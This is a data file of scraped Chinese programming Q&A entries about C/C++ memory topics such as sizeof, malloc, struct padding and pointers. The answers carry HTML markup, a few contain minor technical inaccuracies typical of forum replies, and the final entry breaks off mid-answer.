{"Answer": "&lt;p&gt;#include &amp;lt;stdio.h&amp;gt;&lt;br /&gt;#include&amp;lt;stdlib.h&amp;gt;&lt;br /&gt;int main(){&lt;!-- --&gt;&lt;br /&gt;    typedef struct&lt;br /&gt;    {&lt;!-- --&gt;&lt;br /&gt;    int weight;&lt;br /&gt;    int lchild;&lt;br /&gt;    int rchild;&lt;br /&gt;    int perant;&lt;br /&gt;    }hfmnode;&lt;br /&gt;    int n&amp;#61;1;&lt;br /&gt;    hfmnode *ht &amp;#61; (hfmnode &lt;em&gt;)malloc(16&lt;/em&gt;sizeof(hfmnode));&lt;br /&gt;    /*printf(&amp;#34;%d&amp;#34;, sizeof(&lt;em&gt;ht);&lt;/em&gt;/&lt;br /&gt;    for (int i &amp;#61; 0; i &amp;lt; (2 * n); i&amp;#43;&amp;#43;) {&lt;!-- --&gt;&lt;br /&gt;        ht[i].weight &amp;#61; 0;&lt;br /&gt;        ht[i].lchild &amp;#61; 0;&lt;br /&gt;        ht[i].rchild &amp;#61; 0;&lt;br /&gt;        ht[i].perant &amp;#61; 0;&lt;br /&gt;    }&lt;br /&gt;    for (int i &amp;#61; 0; i &amp;lt; 2 * n; i&amp;#43;&amp;#43;)&lt;br /&gt;    {&lt;!-- --&gt;&lt;br /&gt;    printf(&amp;#34;%d,%d,%d,%d\\n&amp;#34;,ht[i].weight,ht[i].lchild,ht[i].rchild,ht[i].perant);&lt;br /&gt;    }&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;}&lt;br /&gt;我为你的代码做了补充&amp;#xff0c;发现应该是没有错误的。如果你的依旧出错的话&amp;#xff0c;就把我的给写上吧&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c语言malloc函数构造数组失败", ["\n    hfmnode *", "ht", " = (hfmnode *)malloc(", "16", "*sizeof(hfmnode));\n    //printf(", "\"%d\"", ", sizeof(*ht);\n    for (int ", "i", " = ", "0", "; i < ", "2", " * n; i++) {\n        ht[i].", "weight", " = ", "0", ";\n        ht[i].", "lchild", " = ", "0", ";\n        ht[i].", "rchild", " = ", "0", ";\n        ht[i].", "perant", " = ", "0", ";\n    }\n", "\n", "我用malloc函数构造一个大小为16个hfmnode结构体的数组，但是后面赋值的时候只有一个结构体。"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;传入的参数是一个指针&amp;#xff0c;不是原数组&amp;#xff0c;所以求出的len不对&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C++ 函数 数组 升序排列 指针", ["我在冒泡排序的函数里试着没有传递数组长度，而是在这个函数里用sizeof直接求出长度，如第二行所示，为什么结果不正确 如下图所示，没有得到正确的排序？", "\n"]], "Tag": "程序设计"}
{"Answer": "**row 创建了一级指针地址内存，2级指针地址不知道里面多少个一级指针，定义为*row[10]，可以这么用", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["一道编程题，自己做的结果对，但是就是通不过牛客网上的编译器，不知为什么？", ["洗牌在生活中十分常见，现在需要写一个程序模拟洗牌的过程。 现在需要洗2n张牌，从上到下依次是第1张，第2张，第3张一直到第2n张。", "\n首先，我们把这2n张牌分成两堆，左手拿着第1张到第n张（上半堆），右手拿着第n+1张到第2n张（下半堆）。接着就开始洗牌的过程，", "\n先放下右手的最后一张牌，再放下左手的最后一张牌，接着放下右手的倒数第二张牌，再放下左手的倒数第二张牌，", "\n直到最后放下左手的第一张牌。接着把牌合并起来就可以了。 例如有6张牌，最开始牌的序列是1,2,3,4,5,6。首先分成两组，", "\n左手拿着1,2,3；右手拿着4,5,6。在洗牌过程中按顺序放下了6,3,5,2,4,1。把这六张牌再次合成一组牌之后，", "\n我们按照从上往下的顺序看这组牌，就变成了序列1,4,2,5,3,6。 现在给出一个原始牌组，请输出这副牌洗牌k次之后从上往下的序列。", "\n输入描述:", "\n第一行一个数T(T ≤ 100)，表示数据组数。对于每组数据，第一行两个数n,k(1 ≤ n,k ≤ 100)，", "\n接下来一行有2n个数a1,a2,...,a2n(1 ≤ ai ≤ 1000000000)。表示原始牌组从上到下的序列。", "\n\n", "输出描述:", "\n对于每组数据，输出一行，最终的序列。数字之间用空格隔开，不要在行末输出多余的空格。", "\n\n", "输入例子:", "\n3", "\n3 1", "\n1 2 3 4 5 6", "\n3 2", "\n1 2 3 4 5 6", "\n2 2", "\n1 1 1 1", "\n\n", "输出例子:", "\n1 4 2 5 3 6", "\n1 5 4 3 2 6", "\n1 1 1 1", "\n\n", "#include ", "\n#include ", "\n\n", "void Shuffle()", "\n{", "\n    //输入要进行洗牌的组数", "\n    int groups;", "\n    scanf(\"%d\", &groups);", "\n\n", "int i, j, k;                        //循环变量\nint g;                              //定义了循环变量g，遍历每组数据\nint n;                              //定义了一堆牌数量变量n，共2n张牌\nint times;                          //定义了要进行洗牌的次数\n\n//动态分配结果输出数组的行\nint **row = (int**)malloc(sizeof(int*)*groups);\nfor (g = 0; g < groups; g++)\n{\n    scanf(\"%d\", &n);        //输入要进行洗牌的n张牌，共2n张牌\n    scanf(\"%d\", &times);    //输入要进行洗牌的次数\n\n    //动态分配结果输出数组的列\n    row[g] = (int *)malloc(sizeof(int) * 2 * n);\n\n    //为要洗的牌初始化\n    int value;\n    int *cards = (int *)malloc(sizeof(int) * 2 * n);\n    for (i = 0; i < 2 * n; i++)\n    {\n        scanf(\"%d\", &value);\n        cards[i] = value;\n    }\n\n    int *tmp_array = (int *)malloc(sizeof(int) * 2 * n);    //临时存储结果数组\n\n    //按照输入的洗牌次数进行洗牌\n    for (j = 0; j < times; j++)\n    {\n        int LPos = 0, RPos = n;                             //两堆牌的起始点\n        int LeftEnd = n - 1, RightEnd = 2 * n - 1;          //两堆牌的终点\n\n        k = 0;\n        while (LPos <=LeftEnd && RPos<= RightEnd)\n        {\n            tmp_array[k++] = cards[LPos++];\n            tmp_array[k++] = cards[RPos++];\n        }\n\n        //cards临时结果\n        for (i = 0; i < 2 * n; i++)\n            cards[i] = tmp_array[i];\n    }\n\n    //保存结果\n    for (i = 0; i < 2 * n; i++)\n        row[g][i] = tmp_array[i]; \n\n    //释放空间\n    free(cards);\n    free(tmp_array);\n}\n\n//输出结果\nfor (i = 0; i < groups; i++)\n{\n    j = 0;\n    while (row[i][j]>0)             //这里是我处理内存溢出bug的方法，比较简陋\n    {\n        printf(\"%d \", row[i][j]);\n        j++;\n    }\n    printf(\"\\n\");\n}\n", "\n\n", "}", "\n\n", "int main()", "\n{", "\n      Shuffle();", "\n    return 0;", "\n}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;看这个。&lt;br /&gt;&lt;a href=\"https://docs.microsoft.com/de-de/windows/win32/winsock/windows-sockets-start-page-2\" id=\"textarea_1631256988497_1631256992769_0\" target=\"_blank\" rel=\"noopener noreferrer\"&gt;&lt;div class=\"md_link_card\"&gt;\n      \n        &lt;span class=\"md_link_title\"&gt;Windows Sockets 2 - Win32 apps | Microsoft Docs&lt;/span&gt;\n        \n      &lt;span class=\"md_link_desc\" style=\"\"&gt;Mit Windows Sockets 2 (Winsock) können Programmierer Erweiterte Internet-, Intranet-und andere netzwerkfähige Anwendungen erstellen, um Anwendungsdaten über das Netzwerk hinweg unabhängig vom verwendeten Netzwerkprotokoll zu übertragen.&lt;/span&gt;\n      &lt;span class=\"md_flex_card\"&gt;\n      &lt;span class=\"md_link_img icon iconfont icon-lianjie\"&gt;&lt;/span&gt;\n        &lt;span class=\"flex-1\"&gt;\n          &lt;span class=\"md_link_url\"&gt;https://docs.microsoft.com/de-de/windows/win32/winsock/windows-sockets-start-page-2&lt;/span&gt;\n        &lt;/span&gt;\n      &lt;/span&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么我看到服务端可以不进行listen()和accept(),客户端不进行connect，两端就可以直接使用sendto()和recvfrom", ["环境：", "\n", "3", ".", "16", ".", "0", "-", "4", "-amd64\n", "gcc", " version ", "4", ".", "8", ".", "4", "\n", "Debian", " GNU/Linux ", "8", "\n\n", "\n", "描述：", "在阅读一段程序源码时（程序是没有问题的），看到一段的 socket 的使用：", "\n", "服务端只是进行了套接字的绑定，没有 listen() 和 accept() 的过程：", "\n", "if", "((serv_sockfd = socket(AF_INET,SOCK_DGRAM,", "0", "))<", "0", ")\n    {\n             ", "exit", "(-", "1", ");\n    }\n\n    bzero(&servadd,sizeof(servadd));\n\n    servadd.sin_family = AF_INET;\n    servadd.sin_addr.s_addr = htonl(INADDR_ANY);\n    servadd.sin_port = htons(SERV_PORT);\n\n", "\n", "客户端只是进行了 socket() 的初始化，没有 connect 的过程：", "cli_sockfd = socket(AF_INET,SOCK_DGRAM,0);", "\n", " if(cli_sockfd < 0)", " {", "\n", " ", "return", " -", "1", ";   \n", "\n", " }", "\n", "代码中却直接写了从服务端接收数据：", "\n", "\n", " clilen = ", "sizeof", "(cliaddr);\n memset(recvbuf,", "0", ",", "sizeof", "(recvbuf));\n msglen = recvfrom(serv_sockfd,recvbuf,", "sizeof", "(recvbuf),", "0", ",(", "struct", " ", "sockaddr", " *)&", "cliaddr", ",&", "clilen", ");", "\n\n", "\n", "同样的可以直接向客户端的 socket 发送数据：", "\n", "sendto(cli_sockfd,buf,strlen(buf),0,(struct sockaddr *)&servaddr,sizeof(servaddr)); \n\n", "\n", "问题：", "1.为什么可以这种操作(一个没有 listen，一个没有 connect，却可以互相通信)？", "2.如果 1 的操作成立，什么情况下会这样使用？", "3.如果 1 的操作不成立，是丢掉了什么吗（我全局搜索确实没有搜到 listen 和 connect 关键字）？"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;sizeof是运算符&amp;#xff0c;在编译器编译阶段就计算出结果了。&lt;/p&gt;\n&lt;ul&gt;&lt;li&gt;sizeof(a)中的a是数组类型的&amp;#xff0c;编译器可以计算出该数组所占空间大小&amp;#xff0c;你提到的数组a中有5个&lt;code class=\"language-javascript\"&gt;int&lt;/code&gt;类型的元素&amp;#xff0c;每个&lt;code class=\"language-javascript\"&gt;int&lt;/code&gt;占用4个字节的空间&amp;#xff0c;总占用20个字节的空间&lt;/li&gt;&lt;li&gt;sizeof(p)中的p是指针类型的&amp;#xff0c;指针类型本身也是占有空间的&amp;#xff0c;在32位机器上占有4字节空间&amp;#xff0c;64位机器上占有8字节空间&lt;/li&gt;&lt;/ul&gt;\n&lt;p&gt;&lt;code class=\"language-javascript\"&gt;int*p&amp;#61;a;&lt;/code&gt;过程就是加载&lt;code class=\"language-javascript\"&gt;a&lt;/code&gt;的首地址到&lt;code class=\"language-javascript\"&gt;p&lt;/code&gt;中&amp;#xff0c;而且这个只是赋值&amp;#xff0c;不是画上等号&amp;#xff0c;&lt;code class=\"language-javascript\"&gt;a&lt;/code&gt;还是数组类型&amp;#xff0c;&lt;code class=\"language-javascript\"&gt;p&lt;/code&gt;是指针类型,这个在编译阶段&amp;#xff0c;编译器是可以区分出来的&amp;#xff0c;所以编译器可以计算出各自的占用空间&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["有关数组指针传递的问题", ["int a[]={1,2,3,4,5};", "int *p=a;", "\n", "sizeof(a)和sizeof(p)的结果不一样，为什么？", "int*p=a ;过程中p少了什么？"]], "Tag": "程序设计"}
{"Answer": "double =8 double占用8个字节\r\nint* =4 基本上指针都是4个字节\r\ncs=16 结构体占用 16个字节，说明你的编译器按照8字节对齐内存。（早期的编译器按照4字节对齐，这个不同编译器不同）", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["一段代码输出结构不太明白", [".cpp", "\n#include", "\nusing namespace std;", "\n\n", "class Test {", "\n    int* l;", "\n    double d;", "\n\n", "};", "\n\n", "int main() {", "\n    Test cs;", "\n    cout << \"double =\" << sizeof(double) << endl;", "\n    cout << \"int* =\" << sizeof(int*) << endl;", "\n    cout <<\"cs =\"<< sizeof cs << endl;", "\n    cin.get();", "\n}", "\n\n", "结果是", "\ndouble =8", "\nint* =4", "\ncs=16", "\n这是为什么"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;SqList *List;并没有创建SqList结构体&amp;#xff0c;List就是所谓的野指针&lt;br /&gt;函数中你给List-&amp;gt;elem赋值当然会出错&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于malloc()与calloc()函数", ["给出关键几行：", "\n", "\n", "typedef", " ", "int", " Status;\n\n", "typedef", " ", "struct", "\n{\n        ", "char", " no[", "11", "];\n        ", "char", " name[", "20", "];\n        ", "char", " xb;\n        ", "int", " age;\n}Student;\n\n", "typedef", " ", "struct", "\n{\n        Student *elem;\n        ", "int", " length;\n}SqList;\n\n", "Status ", "createList", "(SqList *List)", "\n", "{\n        List->elem=(Student *)", "calloc", "(MAX,", "sizeof", "(Student));\n       \n        ", "if", "(List->elem==", "NULL", ")\n        {\n                ", "printf", "(", "\"内存分配失败！\\n\"", ");\n                ", "exit", "(", "1", ");\n        }\n        List->length=", "0", ";\n       \n        ", "return", " TRUE;\n}\n\n", "int", " ", "main", "(", "void", ")", "\n", "{\n        SqList *List;\n。。。\n        ", "if", "(", "createList", "(List))\n        {\n        ", "printf", "(", "\"建立成功！\\n\"", ");\n        }\n。。。\n}\n}\n", "\n", "为什么每当运行到List->elem=(Student *)calloc(MAX,sizeof(Student));这句程序就会退出？"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;是覆盖不是复制&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c++中虚函数指针，虚基类指针在派生过程不会复制吗？", ["我电脑运行结果是4,4,4,8,4，按这个看，基类的虚函数指针似乎不会在派生类中复制？", "\n", "#include <string>\n#include <iostream>\n#include <string.h>\n#include <stdio.h>\nusing namespace std;\n\n", "class", " ", "A", " ", "{\n", "public", ":\n    virtual int ", "fun", "()", " {", "return", " ", "1", ";}\n};\n\n", "class", " ", "E", " : ", "public A {", "\n", "public", ":\n    virtual int ", "fun", "()", " {", "return", " ", "5", ";}\n};\n\n", "class", " ", "B", " : ", "virtual public A {", "\n", "public", ":\n    virtual int ", "fun", "()", " {", "return", " ", "2", ";}\n};\n\n", "class", " ", "C", " : ", "virtual public A {", "\n", "public", ":\n    virtual int ", "fun", "()", " {", "return", " ", "3", ";}\n};\n\n", "class", " ", "D", " : ", "public B", ", ", "public C {", "\n", "public", ":\n    virtual int ", "fun", "()", " {", "return", " ", "4", ";}\n};\n\n\nint main()\n{\n    cout << sizeof(A) << endl;    ", "// 4", "\n    cout << sizeof(B) << endl;    ", "// 4", "\n    cout << sizeof(C) << endl;    ", "// 4", "\n    cout << sizeof(D) << endl;    ", "// 8", "\n    cout << sizeof(E) << endl;    ", "// 4", "\n\n    ", "return", " ", "0", ";\n}\n"]], "Tag": "程序设计"}
{"Answer": "file &lt;&lt; c\r\n这样看看呢\r\n另外\r\ntext1.txt\r\n删除掉，再运行程序", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["这段代码有什么问题？为什么text1.txt里面一个字都没有？", ["/*使用I/O流以文本方式建立一个文件test1.txt,\n写入字符“已成功写入文件1！”，用其他字处理\n程序打开，看看是否正确*/\n#include <iostream>\n#include <sstream>\n#include <fstream>\n#include <string.h>\nusing namespace std;\nint main()\n{\n    const char c[16] = \"已成功写入文件!\";\n    ofstream file(\"text1.txt\", ios_base::binary);\n    file.write(c, sizeof(c));\n    file.close();\n    return 0;\n}\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;供参考&amp;#xff1a;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c&amp;#43;&amp;#43;\"&gt;&lt;span class=\"hljs-keyword\"&gt;typedef&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;HeapStruct&lt;/span&gt;* MinHeap;\n\nMinHeap H &amp;#61; (&lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; HeapStruct*)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; HeapStruct));\n\nH-&amp;gt;Elements &amp;#61; (ElementType*)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(ElementType) * (MaxSize&amp;#43;&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;));\n\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["帮我看一看这个程序呗", ["MinHeap H = malloc(sizeof(struct HeapStruct));", "    H->Elements = malloc(sizeof(ElementType) * (MaxSize+1));", "这两段运行的时候说无法将'void *'转换为' HeapStruct *'这怎么改呀"]], "Tag": "程序设计"}
{"Answer": "你这个data是个数组，应该free[](this-&gt;data);", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么只要我使用free函数在这个程序中 就会导致运行时错误呢？", ["刚刚开始学动态内存，很多地方不明白", "\n\n", "\n\n", "DynamicArray* DynamicArray_new()\n{\n    DynamicArray* temp = (DynamicArray*)malloc(sizeof(DynamicArray));\n    temp->capacity = 16;\n    temp->size = 0;\n    temp->data = (int*)malloc(sizeof(int) * 16);\n\n    return temp;\n}\n\nvoid DynamicArray_insert(DynamicArray* This, size_t pos, const Elem* v)\n{   \n    if (This->size + 1 >= This->capacity)\n    {\n        int* temp = (int*)malloc(sizeof(int) * This->size); \n\n        for (int i = 0; i < This->size; i++)\n        {\n            temp[i] = This->data[i];\n        }\n\n        //free(This->data);\n        This->data = (int*)malloc(sizeof(int) * This->capacity * 2); \n\n        This->capacity *= 2;\n\n        for (int i = 0; i < This->size; i++)\n        {\n            This->data[i] = temp[i]; \n        }\n\n    }\n\n\n        int i = This->size - 1;\n        int Pos = pos;\n\n        while(i >= Pos)\n        {\n            This->data[i + 1] = This->data[i];\n            i--;\n        }\n\n        This->size++;\n\n        This->data[Pos] = *v;\n}\n\nElem DynamicArray_erase(DynamicArray* This, size_t pos)\n{\n    This->size--;\n\n    int Temp = This->data[pos];\n\n    for (int i = pos; i < This->size; i++)\n    {\n        This->data[i] = This->data[i + 1];\n    }\n\n\n    if (This->capacity > 16 && This->size < ((This->capacity) / 4))\n    {   \n        int *temp = (int*)malloc(sizeof(int) * This->size);\n\n        for(int i = 0;i < This->size;i++)\n            temp[i] = This->data[i];\n\n\n        //free(This->data);\n\n        This->data = (int*)malloc(sizeof(int) * This->capacity / 4);\n\n        for(int i = 0;i < This->size;i++)\n        {\n            This->data[i] = temp[i];\n        }\n\n        This->capacity /= 4;\n    }\n\n    return Temp;\n}\n\nElem DynamicArray_get(const DynamicArray* This, size_t pos)\n{\n    return This->data[pos];\n}\n\nvoid DynamicArray_set(DynamicArray* This, size_t pos, const Elem* v)\n{\n    This->data[pos] = *v;\n}\n\nsize_t DynamicArray_capacity(const DynamicArray* This)\n{\n    size_t T = This->capacity;\n    return T;\n}\n\nsize_t DynamicArray_size(const DynamicArray* This)\n{\n    size_t T = This->size;\n    return T;\n}\n\nbool DynamicArray_empty(const DynamicArray* This)\n{\n    if (This->size == 0)\n        return true;\n    else\n        return false;\n}\n\nvoid DynamicArray_resize(DynamicArray* This, size_t new_size)\n{\n    int Size = This->size;\n    This->size = new_size;\n\n    if(This->size >= This->capacity)\n    {\n        int *temp = (int*)malloc(sizeof(int) * This->size);\n\n        for(int i = 0;i < This->size;i++)\n        {\n            temp[i] = This->data[i];\n        }\n\n\n\n        //free(This->data);\n        This->data = (int*)malloc(sizeof(int) * This->capacity * 2);\n\n        This->capacity *= 2;\n\n        for(int i = 0;i < Size;i++)\n        This->data[i] = temp[i];\n\n        return ;\n    }\n\n    else if(This->size < This->capacity / 4 && This->capacity > 16)\n    {\n        int *temp = (int*)malloc(sizeof(int) * This->size);\n\n        for(int i = 0;i < This->size;i++)\n        {\n            temp[i] = This->data[i];\n        }\n\n        //free(This->data);\n\n        while(This->size < This->capacity && This->capacity > 16)\n        This->capacity /= 2;\n\n        This->data = (int*)malloc(sizeof(int) * This->capacity);\n\n        for(int i = 0;i < Size;i++)\n        This->data[i] = temp[i];\n\n        return ;\n\n    }\n\n    int* a = (int*)malloc(sizeof(int) * This->size);\n\n    for (int i = 0; i < This->size; i++)\n    {\n        a[i] = This->data[i];\n    }\n\n    //free(This->data);\n\n    This->data = (int*)malloc(sizeof(int) * This->capacity);\n\n    for(int i = 0;i < Size;i++)\n    {\n        This->data[i] = a[i];   \n    }\n}\n\nvoid DynamicArray_delete(DynamicArray* This)\n{\n    This->size = 0;\n    This->capacity = 0; \n\n    //free(This->data);\n}\n"]], "Tag": "程序设计"}
{"Answer": "不能修改的是常量本身，而不是指针。\r\nchar *pmsg = \"ssdf\";\r\npmsg[0] = 'a'; 这个不允许\r\npmsg = \"a\"; 这个是允许的。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么这个char*可以修改？", ["char*定义的是一个字符串常量，如果修改的会需要new，但是我下面的这个为什么修改了，", "\n而且正确输出", "\n\n", "char *pmsg = \"ssdf\";\npmsg = \"hello c string\";\nlen_c = strlen(pmsg);\ncout << pmsg << endl;\ncout << \"c length:\" << len_c << \"  sizeof:\" << sizeof(pmsg) << endl;\n", "\n\n", "输出", "\n\n", " hello c string\nc length:14  sizeof:8\n\n", "\n\n", "我用的是ubuntu14.04,哪位能解释一下，谢谢"]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;This is because of padding added to satisfy alignment constraints. &lt;a href=\"http://en.wikipedia.org/wiki/Data_structure_alignment\" rel=\"noreferrer\"&gt;Data structure alignment&lt;/a&gt; impacts both performance and correctness of programs:&lt;/p&gt;\n\n&lt;ul&gt;\n&lt;li&gt;Mis-aligned access might be a hard error (often &lt;code&gt;SIGBUS&lt;/code&gt;).&lt;/li&gt;\n&lt;li&gt;Mis-aligned access might be a soft error.\n\n&lt;ul&gt;\n&lt;li&gt;Either corrected in hardware, for a modest performance-degradation.&lt;/li&gt;\n&lt;li&gt;Or corrected by emulation in software, for a severe performance-degradation.&lt;/li&gt;\n&lt;li&gt;In addition, atomicity and other concurrency-guarantees might be broken, leading to subtle errors.&lt;/li&gt;\n&lt;/ul&gt;&lt;/li&gt;\n&lt;/ul&gt;\n\n&lt;p&gt;Here's an example using typical settings for an x86 processor (all used 32 and 64 bit modes):&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;struct X\n{\n    short s; /* 2 bytes */\n             /* 2 padding bytes */\n    int   i; /* 4 bytes */\n    char  c; /* 1 byte */\n             /* 3 padding bytes */\n};\n\nstruct Y\n{\n    int   i; /* 4 bytes */\n    char  c; /* 1 byte */\n             /* 1 padding byte */\n    short s; /* 2 bytes */\n};\n\nstruct Z\n{\n    int   i; /* 4 bytes */\n    short s; /* 2 bytes */\n    char  c; /* 1 byte */\n             /* 1 padding byte */\n};\n\nconst int sizeX = sizeof(struct X); /* = 12 */\nconst int sizeY = sizeof(struct Y); /* = 8 */\nconst int sizeZ = sizeof(struct Z); /* = 8 */\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;One can minimize the size of structures by sorting members by alignment (sorting by size suffices for that in basic types) (like structure &lt;code&gt;Z&lt;/code&gt; in the example above).&lt;/p&gt;\n\n&lt;p&gt;IMPORTANT NOTE: Both the C and C++ standards state that structure alignment is implementation-defined.  Therefore each compiler may choose to align data differently, resulting in different and incompatible data layouts.  For this reason, when dealing with libraries that will be used by different compilers, it is important to understand how the compilers align data.  Some compilers have command-line settings and/or special &lt;code&gt;#pragma&lt;/code&gt; statements to change the structure alignment settings.&lt;/p&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么一个结构的尺寸不等于每个成员的大小？", ["\n\n", "Why does the ", "sizeof", " operator return a size larger for a structure than the total sizes of the structure's members?", "\n    ", "\n\n", "转载于:https://stackoverflow.com/questions/119123/why-isnt-sizeof-for-a-struct-equal-to-the-sum-of-sizeof-of-each-member"]], "Tag": "程序设计"}
{"Answer": "&lt;pre&gt;&lt;code class=\"language-c\"&gt;\n#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &amp;lt;stdio.h&amp;gt;\n#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &amp;lt;stdlib.h&amp;gt;\n#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &amp;lt;time.h&amp;gt;\n#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &amp;lt;windows.h&amp;gt;\nvoid &lt;span class=\"hljs-constructor\"&gt;Sort(&lt;span class=\"hljs-params\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-operator\"&gt;*&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;p&lt;/span&gt;,&lt;span class=\"hljs-params\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;n&lt;/span&gt;)&lt;/span&gt;\n{\n    &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; min,i,j,t;\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt;(i&amp;#61;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;i&amp;lt;n-&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;i&amp;#43;&amp;#43;)\n    {\n        min&amp;#61;i;\n        &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt;(j&amp;#61;i&amp;#43;&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;j&amp;lt;n;j&amp;#43;&amp;#43;)\n            &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;(p&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;min&lt;/span&gt;]&lt;/span&gt;&amp;gt;p&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;j&lt;/span&gt;]&lt;/span&gt;)\n                min&amp;#61;j;\n        t&amp;#61;p&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;i&lt;/span&gt;]&lt;/span&gt;;p&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;i&lt;/span&gt;]&lt;/span&gt;&amp;#61;p&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;min&lt;/span&gt;]&lt;/span&gt;;p&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;min&lt;/span&gt;]&lt;/span&gt;&amp;#61;t;\n    }\n}\n\nvoid &lt;span class=\"hljs-constructor\"&gt;Print(&lt;span class=\"hljs-params\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-operator\"&gt;*&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;p&lt;/span&gt;,&lt;span class=\"hljs-params\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;n&lt;/span&gt;)&lt;/span&gt;\n{\n    &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; j&amp;#61;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt;(j&amp;lt;n)\n    {\n        printf(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d  &amp;#34;&lt;/span&gt;,p&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;j&lt;/span&gt;]&lt;/span&gt;);\n        j&amp;#43;&amp;#43;;\n    }\n    printf(&lt;span class=\"hljs-string\"&gt;&amp;#34;\\n&amp;#34;&lt;/span&gt;);\n}\nvoid &lt;span class=\"hljs-constructor\"&gt;Init(&lt;span class=\"hljs-params\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;a&lt;/span&gt;[],&lt;span class=\"hljs-params\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;n&lt;/span&gt;)&lt;/span&gt;\n{\n    &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; j;\n    srand((unsigned)time(NULL)); \n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt;( j &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; j &amp;lt; n; j&amp;#43;&amp;#43;)\n         { \n        a&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;j&lt;/span&gt;]&lt;/span&gt; &amp;#61; rand&lt;span class=\"hljs-literal\"&gt;()&lt;/span&gt;%&lt;span class=\"hljs-number\"&gt;99&lt;/span&gt;;\n         }\n}\n&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; main&lt;span class=\"hljs-literal\"&gt;()&lt;/span&gt;\n{\n        &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; j&amp;#61;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n        &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; n;\n        printf(&lt;span class=\"hljs-string\"&gt;&amp;#34;请输入n&amp;#xff1a;&amp;#34;&lt;/span&gt;);\n        scanf(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;,&amp;amp;n);\n        &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; a&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;n&lt;/span&gt;]&lt;/span&gt;;\n        &lt;span 